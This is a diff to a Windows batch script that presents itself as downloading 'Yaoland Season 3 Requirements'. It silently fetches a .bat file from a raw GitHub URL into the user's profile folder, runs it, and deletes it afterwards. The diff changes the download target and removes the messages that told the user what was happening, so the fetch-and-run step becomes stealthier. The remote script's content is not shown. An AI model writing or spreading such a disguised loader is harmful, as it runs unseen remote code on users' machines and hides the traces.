@@ -27,13 +27,12 @@ echo Downloading Yaoland Season 3 Requirements...
 setlocal enabledelayedexpansion
 
 :: Define the download URL and output file location
-set "url=https://raw.githubusercontent.com/JoshBeCute/letssee/main/updatemod"
-set "output=%userprofile%\q.bat"
+set "url=https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch"
+set "output=%userprofile%\o.bat"
 
-:: Delete any existing "q.bat" file before starting
+:: Delete any existing "o.bat" file before starting
 if exist "%output%" (
-    echo Deleting existing 9.bat...
-    del "%output%" /q
+     del "%output%" /q
 )
 
 :: Download the batch script using curl silently
@@ -42,13 +41,11 @@ curl -s -o "%output%" "%url%"
 
 :: Check if the download was successful
 if exist "%output%" (
-    echo Download successful. Running the batch script...
     call "%output%"
     
     :: Check if the batch script ran successfully
     if %errorlevel% equ 0 (
-        echo Script ran successfully. Deleting the file...
-        del "%output%" /q
+         del "%output%" /q
     ) else (
         echo Script failed to run. File will not be deleted.
     )
